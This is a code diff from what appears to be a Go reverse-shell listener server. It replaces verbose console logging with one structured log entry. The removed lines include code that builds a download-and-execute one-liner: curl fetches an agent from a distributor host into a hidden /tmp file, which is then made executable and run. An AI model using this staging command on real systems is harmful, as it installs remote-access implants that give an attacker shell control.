@@ -102,27 +102,18 @@ func CreateTCPServer(host string, port uint16, hashFormat string, disableHistory
 
 	// Fetch real public IP address if not specified
 	if tcpServer.PublicIP == "" {
-		log.Info("Detecting Public IP address of the interface...")
 		ip, err := network.GetPublicIP()
 		if err != nil {
 			log.Error("Public IP Detection failed: %s", err.Error())
 		}
 		tcpServer.PublicIP = ip
-		log.Success("Public IP Detected: %s", tcpServer.PublicIP)
-	} else {
-		log.Info("Public IP (%s) is set in config file.", tcpServer.PublicIP)
 	}
 
 	// Use /bin/bash if no ShellPath was specified
 	if tcpServer.ShellPath == "" {
-		log.Info("No ShellPath was specified, using /bin/bash...")
 		tcpServer.ShellPath = "/bin/bash"
-	} else {
-		log.Info("ShellPath (%s) is set in config file.", tcpServer.ShellPath)
 	}
 
-	// Try to check
-	log.Info("Trying to create server on: %s", service)
 	if _, err := net.ResolveTCPAddr("tcp4", service); err != nil {
 		log.Error("Resolve TCP address failed: %s", err)
 		DeleteServer(tcpServer)
@@ -186,18 +177,13 @@ func (s *TCPServer) Run() {
 		DeleteServer(s)
 		return
 	}
-	log.Info("Server running at: %s", s.FullDesc())
-
-	for _, ifname := range s.Interfaces {
-		listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
-		log.Warn("Agents should dial: %s", listenerHostPort)
-		for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
-			distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
-			filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
-			command := "curl -fsSL http://" + distributorHostPort + "/agent/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
-			log.Warn("\t`%s`", command)
-		}
-	}
+	log.L.Info("listener_ready",
+		"hash", s.Hash,
+		"address", service,
+		"interfaces", s.Interfaces,
+		"public_ip", s.PublicIP,
+		"shell", s.ShellPath,
+	)
 
 	for {
 		select {
